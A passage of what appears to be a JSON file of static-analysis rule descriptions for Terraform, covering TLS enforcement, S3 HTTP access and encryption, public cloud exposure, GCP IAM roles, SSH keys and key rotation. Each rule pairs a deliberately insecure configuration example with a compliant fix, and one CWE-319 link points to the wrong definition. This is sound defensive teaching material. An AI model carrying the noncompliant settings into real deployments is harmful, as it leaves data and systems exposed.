]\n}\n</pre>\n<p>For container clusters:</p>\n<pre>\nresource \"google_container_cluster\" \"example\" {\n  private_cluster_config {\n    enable_private_nodes    = true\n    enable_private_endpoint = true\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6403": {
        "name": "Creating GCP SQL instances without requiring TLS is security-sensitive",
        "htmlDesc": "<p>By default, GCP SQL instances offer encryption in transit, with support for TLS, but insecure connections are still accepted. On an unsecured\nnetwork, such as a public network, the risk of traffic being intercepted is high. When the data isn’t encrypted, an attacker can intercept it and read\nconfidential information.</p>\n<p>When creating a GCP SQL instance, a public IP address is automatically assigned to it and connections to the SQL instance from public networks can\nbe authorized.</p>\n<p>TLS is automatically used when connecting to SQL instances through:</p>\n<ul>\n  <li> The <a href=\"https://cloud.google.com/sql/docs/mysql/connect-admin-proxy\">Cloud SQL Auth proxy</a>. </li>\n  <li> The <a href=\"https://cloud.google.com/sql/docs/mysql/connect-overview#languages\">Java Socket Library</a>. </li>\n  <li> The built-in mechanisms in the <a href=\"https://cloud.google.com/appengine/docs\">App Engine</a> environments. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>Connections are not already automatically encrypted by GCP (eg: SQL Auth proxy) and</p>\n<ul>\n  <li> Connections to the SQL instance are performed on untrusted networks. </li>\n  <li> The data stored in the SQL instance is confidential. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt all connections to the SQL instance, whether using public or private IP addresses. However, since private networks can\nbe considered trusted, requiring TLS in this situation is usually a lower priority task.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nresource \"google_sql_database_instance\" \"example\" { # Sensitive: tls is not required\n  name             = \"noncompliant-master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n    tier = \"db-f1-micro\"\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nresource \"google_sql_database_instance\" \"example\" {\n  name             = \"compliant-master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n    tier = \"db-f1-micro\"\n    ip_configuration {\n      require_ssl = true\n      ipv4_enabled = true\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://cloud.google.com/sql/docs/mysql/authorize-ssl\">GCP Documentation</a> - Cloud SQL: Authorizing with SSL/TLS certificates </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in AWS API Gateway</h2>\n<h3>Code examples</h3>\n<p>These code samples illustrate how to fix this issue in both APIGateway and ApiGatewayV2.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"aws_api_gateway_domain_name\" \"example\" {\n  domain_name = \"api.example.com\"\n  security_policy = \"TLS_1_0\" # Noncompliant\n}\n</pre>\n<p>The ApiGatewayV2 uses a weak TLS version by default:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource \"aws_apigatewayv2_domain_name\" \"example\" {\n  domain_name = \"api.example.com\"\n  domain_name_configuration {} # Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"aws_api_gateway_domain_name\" \"example\" {\n  domain_name = \"api.example.com\"\n  security_policy = \"TLS_1_2\"\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nresource \"aws_apigatewayv2_domain_name\" \"example\" {\n  domain_name = \"api.example.com\"\n  domain_name_configuration {\n    security_policy = \"TLS_1_2\"\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "terraform:S6249": {
        "name": "Authorizing HTTP communications with S3 buckets is security-sensitive",
        "htmlDesc": "<p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>\n<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It\nmeans that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to deny all HTTP requests:</p>\n<ul>\n  <li> for all objects (<code>*</code>) of the bucket </li>\n  <li> for all principals (<code>*</code>) </li>\n  <li> for all actions (<code>*</code>) </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>No secure policy is attached to this bucket:</p>\n<pre>\nresource \"aws_s3_bucket\" \"mynoncompliantbucket\" { # Sensitive\n  bucket = \"mynoncompliantbucketname\"\n}\n</pre>\n<p>A policy is defined but forces only HTTPs communication for some users:</p>\n<pre>\nresource \"aws_s3_bucket\" \"mynoncompliantbucket\" { # Sensitive\n  bucket = \"mynoncompliantbucketname\"\n}\n\nresource \"aws_s3_bucket_policy\" \"mynoncompliantbucketpolicy\" {\n  bucket = \"mynoncompliantbucketname\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Id      = \"mynoncompliantbucketpolicy\"\n    Statement = [\n      {\n        Sid       = \"HTTPSOnly\"\n        Effect    = \"Deny\"\n        Principal = [\n          \"arn:aws:iam::123456789123:root\"\n        ] # secondary location: only one principal is forced to use https\n        Action    = \"s3:*\"\n        Resource = [\n          aws_s3_bucket.mynoncompliantbucketpolicy.arn,\n          \"${aws_s3_bucket.mynoncompliantbucketpolicy.arn}/*\",\n        ]\n        Condition = {\n          Bool = {\n            \"aws:SecureTransport\" = \"false\"\n          }\n        }\n      },\n    ]\n  })\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>A secure policy that denies all HTTP requests is used:</p>\n<pre>\nresource \"aws_s3_bucket\" \"mycompliantbucket\" {\n  bucket = \"mycompliantbucketname\"\n}\n\nresource \"aws_s3_bucket_policy\" \"mycompliantpolicy\" {\n  bucket = \"mycompliantbucketname\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Id      = \"mycompliantpolicy\"\n    Statement = [\n      {\n        Sid       = \"HTTPSOnly\"\n        Effect    = \"Deny\"\n        Principal = \"*\"\n        Action    = \"s3:*\"\n        Resource = [\n          aws_s3_bucket.mycompliantbucket.arn,\n          \"${aws_s3_bucket.mycompliantbucket.arn}/*\",\n        ]\n        Condition = {\n          Bool = {\n            \"aws:SecureTransport\" = \"false\"\n          }\n        }\n      },\n    ]\n  })\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit\">AWS documentation</a> - Enforce encryption\n  of data in transit </li>\n  <li> <a href=\"https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5\">AWS Foundational Security\n  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "terraform:S6329": {
        "name": "Allowing public network access to cloud resources is security-sensitive",
        "htmlDesc": "<p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft\nor disruption.</p>\n<p>Depending on the component, inbound access from the Internet can be enabled via:</p>\n<ul>\n  <li> a boolean value that explicitly allows access to the public network. </li>\n  <li> the assignment of a public IP address. </li>\n  <li> database firewall rules that allow public IP ranges. </li>\n</ul>\n<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>\n<p>This decision increases the likelihood of attacks on the organization, such as:</p>\n<ul>\n  <li> data breaches. </li>\n  <li> intrusions into the infrastructure to permanently steal from it. </li>\n  <li> and various malicious traffic, such as DDoS attacks. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>This cloud resource:</p>\n<ul>\n  <li> should be publicly accessible to any Internet user. </li>\n  <li> requires inbound traffic from the Internet to function properly. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce\nsites.</p>\n<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud\ncomponents.</p>\n<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the\nabsence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>\n<h2>Sensitive Code Example</h2>\n<p>For AWS:</p>\n<pre>\nresource \"aws_instance\" \"example\" {\n  associate_public_ip_address = true # Sensitive\n}\n</pre>\n<pre>\nresource \"aws_dms_replication_instance\" \"example\" {\n  publicly_accessible = true # Sensitive\n}\n</pre>\n<p>For Azure:</p>\n<pre>\nresource \"azurerm_postgresql_server\" \"example\"  {\n  public_network_access_enabled = true # Sensitive\n}\n</pre>\n<pre>\nresource \"azurerm_postgresql_server\" \"example\"  {\n  public_network_access_enabled = true # Sensitive\n}\n</pre>\n<pre>\nresource \"azurerm_kubernetes_cluster\" \"production\" {\n  api_server_authorized_ip_ranges = [\"176.0.0.0/4\"] # Sensitive\n  default_node_pool {\n    enable_node_public_ip = true # Sensitive\n  }\n}\n</pre>\n<p>For GCP:</p>\n<pre>\nresource \"google_compute_instance\" \"example\" {\n  network_interface {\n    network = \"default\"\n\n    access_config {  # Sensitive\n      # Ephemeral public IP\n    }\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<p>For AWS:</p>\n<pre>\nresource \"aws_instance\" \"example\" {\n  associate_public_ip_address = false\n}\n</pre>\n<pre>\nresource \"aws_dms_replication_instance\" \"example\" {\n  publicly_accessible          = false\n}\n</pre>\n<p>For Azure:</p>\n<pre>\nresource \"azurerm_postgresql_server\" \"example\"  {\n  public_network_access_enabled = false\n}\n</pre>\n<pre>\nresource \"azurerm_kubernetes_cluster\" \"production\" {\n  api_server_authorized_ip_ranges = [\"192.168.0.0/16\"]\n  default_node_pool {\n    enable_node_public_ip = false\n  }\n}\n</pre>\n<p>For GCP:</p>\n<pre>\nresource \"google_compute_instance\" \"example\" {\n  network_interface {\n    network = google_compute_network.vpc_network_example.name\n  }\n}\n</pre>\n<p>Note that setting <code>network=\"default\"</code> in the network interface block leads to other security problems such as removal of logging, Cloud\nVPN/VPC network peering, and the addition of insecure firewall rules.<br> A safer alternative includes creating a specific VPC or subnetwork and\nenforce security measures.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html\">AWS Documentation</a> - Amazon EC2 instance IP\n  addressing </li>\n  <li> <a href=\"https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html\">AWS Documentation</a> - Public and\n  private replication instances </li>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html\">AWS Documentation</a> - VPC Peering </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "terraform:S6406": {
        "name": "Excessive granting of GCP IAM permissions is security-sensitive",
        "htmlDesc": "<p>Excessive granting of GCP IAM permissions can allow attackers to exploit an organization’s cloud resources with malicious intent.</p>\n<p>To prevent improper creation or deletion of resources after an account is compromised, proactive measures include both following GCP Security\nInsights and ensuring custom roles contain as few privileges as possible.</p>\n<p>After gaining a foothold in the target infrastructure, sophisticated attacks typically consist of two major parts.<br> First, attackers must deploy\nnew resources to carry out their malicious intent. To guard against this, operations teams must control what unexpectedly appears in the\ninfrastructure, such as what is:</p>\n<ul>\n  <li> added </li>\n  <li> written down </li>\n  <li> updated </li>\n  <li> started </li>\n  <li> appended </li>\n  <li> applied </li>\n  <li> accessed. </li>\n</ul>\n<p>Once the malicious intent is executed, attackers must avoid detection at all costs.<br> To counter attackers' attempts to remove their\nfingerprints, operations teams must control what unexpectedly disappears from the infrastructure, such as what is:</p>\n<ul>\n  <li> stopped </li>\n  <li> disabled </li>\n  <li> canceled </li>\n  <li> deleted </li>\n  <li> destroyed </li>\n  <li> detached </li>\n  <li> disconnected </li>\n  <li> suspended </li>\n  <li> rejected </li>\n  <li> removed. </li>\n</ul>\n<p>For operations teams to be resilient in this scenario, their organization must apply both:</p>\n<ul>\n  <li> Detection security: log these actions to better detect malicious actions. </li>\n  <li> Preventive security: review and limit granted permissions. </li>\n</ul>\n<p>This rule raises an issue when a custom role grants a number of sensitive permissions (read-write or destructive permission) that is greater than a\ngiven parameter.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This custom role will be mostly used for read-only purposes. </li>\n  <li> Compliance policies require read-only access. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>To reduce the risks associated with this role after a compromise:</p>\n<ul>\n  <li> Reduce the list of permissions to grant only those that are actually needed. </li>\n  <li> Favor read-only over read-write. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>This custom role grants more than 5 sensitive permissions:</p>\n<pre>\nresource \"google_project_iam_custom_role\" \"example\" {\n  permissions = [ # Sensitive\n    \"resourcemanager.projects.create\", # Sensitive permission\n    \"resourcemanager.projects.delete\", # Sensitive permission\n    \"resourcemanager.projects.get\",\n    \"resourcemanager.projects.list\",\n    \"run.services.create\", # Sensitive permission\n    \"run.services.delete\", # Sensitive permission\n    \"run.services.get\",\n    \"run.services.getIamPolicy\",\n    \"run.services.setIamPolicy\",  # Sensitive permission\n    \"run.services.list\",\n    \"run.services.update\",  # Sensitive permission\n  ]\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>This custom role grants less than 5 sensitive permissions:</p>\n<pre>\nresource \"google_project_iam_custom_role\" \"example\" {\n  permissions = [\n    \"resourcemanager.projects.get\",\n    \"resourcemanager.projects.list\",\n    \"run.services.create\",\n    \"run.services.delete\",\n    \"run.services.get\",\n    \"run.services.getIamPolicy\",\n    \"run.services.list\",\n    \"run.services.update\",\n  ]\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://cloud.google.com/iam/docs/recommender-overview\">GCP Docs</a> - Enforce least privilege with role recommendations </li>\n  <li> <a href=\"https://cloud.google.com/iam/docs/manage-policy-insights\">GCP Docs</a> - Security Insights </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6245": {
        "name": "Disabling server-side encryption of S3 buckets is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is\nread from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if\nthey were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure\nitself.</p>\n<p>There are three SSE options:</p>\n<ul>\n  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)\n    <ul>\n      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)\n    <ul>\n      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>\n    </ul>  </li>\n  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)\n    <ul>\n      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s\n      encryption keys. </li>\n    </ul>  </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive information. </li>\n  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>\n<h2>Sensitive Code Example</h2>\n<p>Server-side encryption is not used:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" { # Sensitive\n  bucket = \"example\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Server-side encryption with Amazon S3-managed keys is used for AWS provider version 3 or below:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        sse_algorithm = \"AES256\"\n      }\n    }\n  }\n}\n</pre>\n<p>Server-side encryption with Amazon S3-managed keys is used for AWS provider version 4 or above:</p>\n<pre>\nresource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.example.bucket\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html\">AWS documentation</a> - Protecting data using\n  server-side encryption </li>\n</ul>",
        "severity": "MINOR"
      },
      "terraform:S6400": {
        "name": "Granting highly privileged GCP resource rights is security-sensitive",
        "htmlDesc": "<p>Granting highly privileged resource rights to users or groups can reduce an organization’s ability to protect against account or service theft. It\nprevents proper segregation of duties and creates potentially critical attack vectors on affected resources.</p>\n<p>If elevated access rights are abused or compromised, both the data that the affected resources work with and their access tracking are at risk.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This GCP resource is essential to the information system infrastructure. </li>\n  <li> This GCP resource is essential to mission-critical functions. </li>\n  <li> Compliance policies require that administrative privileges for this resource be limited to a small group of individuals. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Grant IAM policies or members a less permissive role: In most cases, granting them read-only privileges is sufficient.</p>\n<p>Separate tasks by creating multiple roles that do not use a full access role for day-to-day work.</p>\n<p>If the predefined GCP roles do not include the specific permissions you need, create <a\nhref=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam_custom_role\">custom IAM roles</a>.</p>\n<h2>Sensitive Code Example</h2>\n<p>For an IAM policy setup:</p>\n<pre>\ndata \"google_iam_policy\" \"admin\" {\n  binding {\n    role = \"roles/run.admin\" # Sensitive\n    members = [\n      \"user:name@example.com\",\n    ]\n  }\n}\n\nresource \"google_cloud_run_service_iam_policy\" \"policy\" {\n  location = google_cloud_run_service.default.location\n  project = google_cloud_run_service.default.project\n  service = google_cloud_run_service.default.name\n  policy_data = data.google_iam_policy.admin.policy_data\n}\n</pre>\n<p>For an IAM policy binding:</p>\n<pre>\nresource \"google_cloud_run_service_iam_binding\" \"example\" {\n  location = google_cloud_run_service.default.location\n  project = google_cloud_run_service.default.project\n  service = google_cloud_run_service.default.name\n  role = \"roles/run.admin\" # Sensitive\n  members = [\n    \"user:name@example.com\",\n  ]\n}\n</pre>\n<p>For adding a member to a policy:</p>\n<pre>\nresource \"google_cloud_run_service_iam_member\" \"example\" {\n  location = google_cloud_run_service.default.location\n  project = google_cloud_run_service.default.project\n  service = google_cloud_run_service.default.name\n  role = \"roles/run.admin\" # Sensitive\n  member = \"user:name@example.com\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For an IAM policy setup:</p>\n<pre>\ndata \"google_iam_policy\" \"admin\" {\n  binding {\n    role = \"roles/viewer\"\n    members = [\n      \"user:name@example.com\",\n    ]\n  }\n}\n\nresource \"google_cloud_run_service_iam_policy\" \"example\" {\n  location = google_cloud_run_service.default.location\n  project = google_cloud_run_service.default.project\n  service = google_cloud_run_service.default.name\n  policy_data = data.google_iam_policy.admin.policy_data\n}\n</pre>\n<p>For an IAM policy binding:</p>\n<pre>\nresource \"google_cloud_run_service_iam_binding\" \"example\" {\n  location = google_cloud_run_service.default.location\n  project = google_cloud_run_service.default.project\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  members = [\n    \"user:name@example.com\",\n  ]\n}\n</pre>\n<p>For adding a member to a policy:</p>\n<pre>\nresource \"google_cloud_run_service_iam_member\" \"example\" {\n  location = google_cloud_run_service.default.location\n  project = google_cloud_run_service.default.project\n  service = google_cloud_run_service.default.name\n  role = \"roles/viewer\"\n  member = \"user:name@example.com\"\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6405": {
        "name": "Enabling project-wide SSH keys to access VM instances is security-sensitive",
        "htmlDesc": "<p>SSH keys stored and managed in a project’s metadata can be used to access GCP VM instances. By default, GCP automatically deploys project-level SSH\nkeys to VM instances.</p>\n<p>Project-level SSH keys can lead to unauthorized access because:</p>\n<ul>\n  <li> Their use prevents fine-grained VM-level access control and makes it difficult to follow <a\n  href=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. </li>\n  <li> Unlike managed access control with <a href=\"https://cloud.google.com/compute/docs/instances/managing-instance-access\">OS Login</a>, manual\n  cryptographic key management is error-prone and requires careful attention. For example, if a user leaves a project, their SSH keys should be\n  removed from the metadata to prevent unwanted access. </li>\n  <li> If a project-level SSH key is compromised, all VM instances may be compromised. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> VM instances in a project have different security requirements. </li>\n  <li> Many users with different profiles need access to the VM instances in that project. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Block project-level SSH keys by setting the <code>metadata.block-project-ssh-keys</code> argument to <code>true</code> </li>\n  <li> Use <a href=\"https://cloud.google.com/compute/docs/instances/access-overview?_ga=2.125788746.-190863609.1642494607#oslogin\">OSLogin</a> to\n  benefit from managed access control. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nresource \"google_compute_instance\" \"example\" { # Sensitive, because metadata.block-project-ssh-keys is not set to true\n  name         = \"example\"\n  machine_type = \"e2-micro\"\n  zone         = \"us-central1-a\"\n\n  network_interface {\n    network = \"default\"\n\n    access_config {\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nresource \"google_compute_instance\" \"example\" {\n  name         = \"example\"\n  machine_type = \"e2-micro\"\n  zone         = \"us-central1-a\"\n\n  metadata = {\n    block-project-ssh-keys = true\n  }\n\n  network_interface {\n    network = \"default\"\n\n    access_config {\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/269\">CWE-269 - Improper Privilege Management</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/272\">CWE-272 - Least Privilege Violation</a> </li>\n  <li> <a href=\"https://cloud.google.com/compute/docs/connect/restrict-ssh-keys#remove-metadata-key\">GCP Documentation</a> - Restrict SSH keys from\n  VMs </li>\n  <li> <a href=\"https://cloud.google.com/compute/docs/instances/access-overview#risks\">GCP Documentation</a> - Risks of manual key management </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6401": {
        "name": "Creating keys without a rotation period is security-sensitive",
        "htmlDesc": "<p>The likelihood of security incidents increases when cryptographic keys are used for a long time. Thus, to strengthen the data protection it’s\nrecommended to rotate the symmetric keys created with the Google Cloud Key Management Service (KMS) automatically and periodically. Note that it’s not\npossible in GCP KMS to rotate asymmetric keys automatically.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The cryptographic key is a symmetric key. </li>\n  <li> The application requires compliance with some security standards like PCI-DSS. </li>\n</ul>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to rotate keys automatically and regularly. The shorter the key period, the less data can be decrypted by an attacker if a key is\ncompromised. So the key rotation period usually depends on the amount of data encrypted with a key or other requirements such as compliance with\nsecurity standards. In general, a period of time of 90 days can be used.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nresource \"google_kms_crypto_key\" \"noncompliant-key\" { # Sensitive: no rotation period is defined\n  name            = \"example\"\n  key_ring        = google_kms_key_ring.keyring.id\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nresource \"google_kms_crypto_key\" \"compliant-key\" {\n  name            = \"example\"\n  key_ring        = google_kms_key_ring.keyring.id\n  rotation_period = \"7776000s\" # 90 days\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a 